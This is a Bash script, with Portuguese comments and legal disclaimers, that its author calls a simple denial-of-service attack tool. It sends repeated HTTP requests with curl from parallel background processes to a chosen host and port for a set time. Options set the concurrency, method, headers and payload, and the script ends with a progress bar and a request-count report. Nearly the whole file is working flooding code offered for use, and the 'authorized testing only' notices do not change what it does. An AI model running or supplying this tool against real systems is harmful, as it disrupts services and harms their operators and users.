#!/usr/bin/env bash

# Nome: bash_attacker
# Autor: Erik Castro
# Data de Criação: 08/10/2024
# Data de modificação: 13/10/2024
# Decription: Simples script de ataque de negação de
# serviço.
# Versão: 0.4.1-alpha
# # ================================================
# Versões:
# -----------
# Versão 0.0.1-alpha: Código básico implementado.
# Versão 0.3.1-alpha: Melhorias na requisição
# Versão 0.4.0-alpha: Relatório Geral implementado.
# Versão 0.4.1-alpha: Implementado tempo de espera
#
# =====================================================
# Licensa:
# ------------
# Copyright 2024 Erik Castro
#
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
# =====================================================
# AVISO LEGAL:
# ------------
# Este software é uma ferramenta de pesquisa e desenvolvimento em segurança da informação, especificamente projetada para simular ataques de negação de serviço (DoS).
#
# É distribuído sob a licença MIT e seu código fonte está disponível publicamente. No entanto, o uso desta ferramenta deve ser restrito a ambientes de testes autorizados e com o objetivo exclusivo de estudar e compreender vulnerabilidades em sistemas de computação.
#
# O autor não se responsabiliza por qualquer uso indevido ou ilícito deste software, incluindo, mas não se limitando a: ataques a sistemas produtivos, violação de leis e regulamentos, ou danos a terceiros.
#
# Ao utilizar esta ferramenta, o usuário concorda em:
#
#    Cumprir integralmente a Lei Geral de Proteção de Dados (LGPD), especialmente no que diz respeito ao tratamento de dados pessoais.
#    Respeitar a legislação brasileira, em particular o Código Penal, no que se refere aos crimes cibernéticos.
#    Obter todas as autorizações necessárias antes de realizar qualquer teste de penetração ou simulação de ataque.
#    Não direcionar ataques a sistemas ou redes sem autorização expressa.
#
# A distribuição, modificação ou comercialização desta ferramenta sem a devida atribuição de autoria é proibida.
#
# Este software é fornecido "como está", sem qualquer garantia expressa ou implícita.
#

# Chaves
host_alvo="localhost"
porta_alvo="80"
threads_atual=1
_total_req=0
tempo_ataque=35
temp_file_fa=$(mktemp)
echo 0 > $temp_file_fa # inicializando temp fa
temp_file_su=$(mktemp)
echo 0 > $temp_file_su # inicializa tem su
tempo_espera=1
method="GET"
headers=()
payload=""
ABORT=0

# limpa arquivos temporarios
limpa_tmp(){
    echo Limpando arquivos temporários
    rm -f $temp_file_fa $temp_file_su $temp_total_req "*.lock"
    [[ $? -eq "0" ]] && return 0 || return 1
}

# despeja uma mensagem para a saída de erro padrão com data e hora.
msg_erro() {
    printf "[ERRO]: %s \t %s\n" "$*" "$(date +'%d/%m/%Y %X')" >&2
}

# Mostra a versão atual do software
exibe_versao() {
    echo -n "$(basename $0)"
    grep -E "^# Versão " $0 | tail -n1 | sed 's/^#//g' | cut -d: -f1
    printf "Copyright \u00A9 2024 Erik Castro\nUse \"--show\" para mais informações.\n\n"
}

# Exibe a Licença de SoftWare.
exibe_licen() {
    echo
    awk '/# Copyright/,/# THE SOFTWARE/' $0 | tr -d "\#" | sed "s/^# //g" | sed '$d'
}

# Exibe instruções de uso
exibe_uso() {
    echo "Uso: $0 [opções] <host> <porta>"
    echo
    echo "Este script realiza um ataque de negação de serviço (DoS) simples."
    echo
    echo "Opções:"
    echo "  -h, --help         Exibe esta mensagem de ajuda"
    echo "  --change-log       Exibe o histórico de mudanças"
    echo "  --show             Exibe a licença"
    echo "  -v, --version      Exibe a versão"
    echo "  -p, --port <porta> Especifica a porta alvo (padrão: 80)"
    echo "  -t, --time <tempo> Define o tempo de ataque em segundos (padrão: 35)"
    echo "  -c, --childs <n>   Define o número de threads/child processes simultâneos (padrão: 1)"
    echo "  --debug            Habilita o modo debug"
    echo "  -w, --wait <tempo> Define o tempo de espera para cometar a requisição. (padrão: 1)"
    echo "  -H, --headers, <chave:valor> Define um cabeçalho personalizado"
    echo "  -m, --method <método> define o método da requisição."
    echo "  -P, --payload <payload> define o payload personalizado"
    echo
    echo "Exemplo de uso:"
    echo "  $0 -p 8080 -t 60 -c 5 <host_alvo>"
    echo
    echo "Este script é fornecido 'como está', sem garantias, e seu uso é de inteira responsabilidade do usuário."
}

# Exibe o histórico de atualizações
exibe_hist() {
    echo -e " ----------\n  Versões:\n ----------"
    grep -w "^# Versão" $0 | tr -d "\#" | sed '1d' | column -s: -t
}

# Faz a requisição
requisitar() {
    local host=$1
    local port=$2
    local sucess=$(cat $temp_file_su)
    local fail=$(cat $temp_file_fa)
    local req=$(cat $temp_file_req)
    local flags="-X ${method} ${headers[@]}"
    
    if [[ $method == "POST" || $method == "PUT" ]]; then
	flags="-X ${method} ${headers[@]} -d ${payload}"
    fi

    curl $flags --silent --max-time "$tempo_espera" -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" "${host}:${port}" &>/dev/null
    if [[ "$?" -eq "0" ]]; then
	((sucess++))
	echo $sucess >$temp_file_su
    else
	((fail++))
	echo $fail >$temp_file_fa
    fi
}

# Valida se ip é valido (IPv4)
validar_ip() {
    local ip="$1"
    # Verifica se o IP está no formato correto de IPv4
    if [[ $ip =~ ^([[:digit:]]{1,3}\.){3}[[:digit:]]{1,3}$ ]]; then
        return 0
    fi
    return 1
}

# Valida se é um host válido (domínio ou IP)
validar_host() {
    local host="$1"

    # Expressão regular para validar um nome de domínio (inclui subdomínios e domínios de TLD com mais de 3 letras)
    if [[ $host =~ ^(https?:\/\/)?(([a-zA-Z0-9](-*[a-zA-Z0-9])*)\.)+[a-zA-Z]{2,}(:\d+)?(\/[^\s]*)?$  ]]; then
        return 0
    # Verifica se é um IP válido
    elif validar_ip "$host"; then
        return 0
    else
        return 1
    fi
}

# Função que exibe a barra de progresso
progress_bar() {
    local current=$1     # Valor atual do progresso
    local width=${2:-30} # Largura da barra de progresso (valor padrão 50)
    local total=$3       # Valor total a ser atingido

    # Calcula a porcentagem de progresso
    local progress=$(( current * 100 / total ))
    
    # Calcula a quantidade de "#" (completado) e "-" (restante)
    local done=$((progress * width / 100))
    local left=$((width - done))

    # Cores da barra
    local YELLOW="\x1b[33m"
    local RESET="\x1b[0m"

    # Gera a barra de progresso com tamanho fixo
    printf "["
    printf "${YELLOW}%0.s\u2588" $(seq 1 $done)    # Imprime os símbolos "#" (completado)
    printf "%0.s " $(seq 1 $left)    # Imprime os símbolos "-" (restante)
    printf "${RESET}] %03d%% (%2d/%2d)\r" $progress $current $total # imprime a barra de progresso.
}

# valida a entrada de paramêtros
menu_check() {

    while [[ -n $1 ]]; do
        case "$1" in
	-m|--method)
	    shift
	    [[ -n "$1" ]] && method="$1"
	    ;;
	-H|--headers)
	    shift
	    [[ -n "$1" ]] && headers+=("-H" "$1")
	    ;;
	-P|--payload)
	    shift
	    [[ -n "$1" ]] && payload="$1"
	    ;;
	-w|--wait)
	    shift
	    [[ "$1" -ge 1 ]] && tempo_espera="$1"
	    ;;
	-p|--port)
	    shift
	    [[ "$1" -ge 1  ]] && porta_alvo="$1" 
	;;
	-t|--time)
	    shift
	    [[ "$1" -gt 0 ]] && tempo_ataque="$1"
	    ;;
	-c|--childs)
	    shift
	    [[ "$1" -gt 0 ]] && threads_atual="$1"
	    ;;
        -host)
            shift
            if validar_host "$1"; then
                host_alvo="$1"
            else
                msg_erro "Host: \"$1\" inválido!"
                return 1
            fi
            ;;
        -d | --debug) set -x ;;
        -h | --help)
            exibe_uso
            exit 0
            ;;
        --change-log)
            exibe_hist
            exit 0
            ;;
        --show)
            exibe_licen
            exit 0
            ;;
        -v | --version)
            exibe_versao
            exit 0
            ;;
        *)
            msg_erro "Paramêtro fornecido: \"$1\", invalido!"
            return 1
            ;;
        esac
        shift
    done
    return 0
}

ataque(){
    local controle=0 # Variavel de controle.
    local host="$1"
    local port="$2"
    local t_ataque="$3"
    local t_final="$((SECONDS + t_ataque))"

    while [[ SECONDS -lt t_final  ]]; do 
	[[ $ABORT -eq 1 ]] && {
	    echo Saida forçada pelo usiário!
	    break
	    limpa_tmp
	} # se 1 loop quebrado.

       progress_bar $SECONDS 30 $t_final

       requisitar $host $port &
       ((_total_req++))
       ((controle++))
       if [[ "$controle" -ge "$threads_atual" ]]; then
          wait -n # Espera até que uma termine
	  ((controle--))
       fi
    done
    wait # Aguarda que todod terminem.
}

banner_fn() {
    # Definição de cores
    local RED="\033[1;31m"
    local YELLOW="\033[1;33m"
    local GREEN="\033[1;32m"
    local RST="\033[0m"

    # Título do banner
    local BANNER_TITLE="Bash Attacker"
    local WARNING_MSG="AVISO: Uso desta ferramenta apenas para fins educativos e ambientes autorizados."
    local RESPONSIBILITY_MSG="Você é totalmente responsável por qualquer ação realizada com este software."

    # Verificação se 'figlet' e 'lolcat' estão instalados
    if command -v figlet >/dev/null 2>&1 && command -v lolcat >/dev/null 2>&1; then
        # Exibe o banner colorido com figlet e lolcat
        figlet -tc "$BANNER_TITLE" | lolcat
        echo -e "${RED}$WARNING_MSG${RST}" | lolcat
        echo -e "${YELLOW}$RESPONSIBILITY_MSG${RST}" | lolcat
    else
        # Caso figlet ou lolcat não estejam instalados, exibe um banner simples
        echo -e "${GREEN}========= $BANNER_TITLE =========${RST}"
        echo -e "${RED}$WARNING_MSG${RST}"
        echo -e "${YELLOW}$RESPONSIBILITY_MSG${RST}"
    fi

    echo # Adiciona uma linha em branco
}

gerar_relatorio(){
    local RED="\033[1;31m"
    local GREEN="\033[1;32m"
    local YELLOW="\033[1;33m"
    local CYAN="\033[1;36m"
    local RST="\033[0m"

    local tempo_decorrido=$SECONDS
    local total_falhas=$(cat $temp_file_fa)
    local total_sucessos=$(cat $temp_file_su)

    # Proteção contra divisão por zero
    local media_req_por_seg="N/A"
    local media_req_por_thread="N/A"

    if [[ $tempo_decorrido -gt 0 ]]; then
        media_req_por_seg=$(echo "scale=2; $_total_req / $tempo_decorrido" | bc)
    fi

    if [[ $threads_atual -gt 0 ]]; then
        media_req_por_thread=$(echo "scale=2; $_total_req / $threads_atual" | bc)
    fi

    echo -e "${CYAN}======================================"
    echo -e "${YELLOW}              RELATÓRIO               ${CYAN}"
    echo -e "======================================${RST}"
    echo -e "${GREEN}Total de Requisições: ${CYAN}${_total_req}${RST}"
    echo -e "${RED}Requisições Falhas: ${CYAN}${total_falhas}${RST}"
    echo -e "${GREEN}Requisições Bem Sucedidas: ${CYAN}${total_sucessos}${RST}"
    echo -e "${YELLOW}Tempo Decorrido: ${CYAN}${tempo_decorrido} segundos${RST}"
    echo -e "${YELLOW}Média de Requisições por Segundo: ${CYAN}${media_req_por_seg} req/s${RST}"
    echo -e "${YELLOW}Média de Requisições por Thread: ${CYAN}${media_req_por_thread} req/thread${RST}"
    echo -e "${CYAN}======================================${RST}"
}

sg_abort(){
    ABORT=1
}

trap sg_abort SIGINT SIGTERM SIGABRT SIGSTOP

main() {
    banner_fn
    menu_check $@ || exit 1 
    ataque $host_alvo $porta_alvo "$tempo_ataque"
    gerar_relatorio
    limpa_tmp
    return 0
}

main "$@" && echo encerrando execucao! | figlet -ctf miniwi | lolcat

